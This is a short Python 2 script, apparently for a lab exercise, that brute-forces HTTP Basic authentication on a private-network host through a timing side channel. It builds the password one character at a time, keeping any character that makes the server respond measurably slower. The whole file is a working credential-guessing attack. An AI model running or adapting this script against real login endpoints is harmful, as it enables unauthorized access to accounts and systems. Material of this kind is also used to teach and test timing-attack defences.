#!/usr/bin/env python
import httplib2, base64, time, string, sys, signal

print "Bruteforce script"

def b64creds(username, password):
	return base64.b64encode("{0}:{1}".format(username, password).encode('utf-8')).decode()

def calc_delta(deltas):
	if len(deltas) < 2:
		return 0
	return deltas[-1]-deltas[-2]

def make_request(username, guess):
	start_time = time.time()
	cred = b64creds(username, guess)
	headers = {'Authorization': "Basic %s" % cred}
	h = httplib2.Http('.cache')
	response, content = h.request("http://"+server+request_path, "GET", headers=headers)

	end_time = time.time() - start_time
	deltas.append(end_time)

	if response.status == 200:
		print "Success! %s" % guess
		sys.exit(0)

	delta = calc_delta(deltas)
	print "{0}:{1} -> {2}, delta {3}".format(username, guess, end_time, delta)
	return delta

def signal_handler(signal, frame):
	print
	sys.exit(0)

def iterate():
	global password;

	for p in charset:
		delta = make_request(username, password + p)

		if delta > treshold:
			password = password + p
			return

signal.signal(signal.SIGINT, signal_handler)

username="hacker"
password=""
passwd_max_len=7
deltas=[]
treshold = 0.1

server="192.168.56.101"
port=80
method="GET"
request_path="/authentication/example2/"
charset = string.lowercase+string.digits

while len(password) <= passwd_max_len:
	iterate()
print "Failure!"
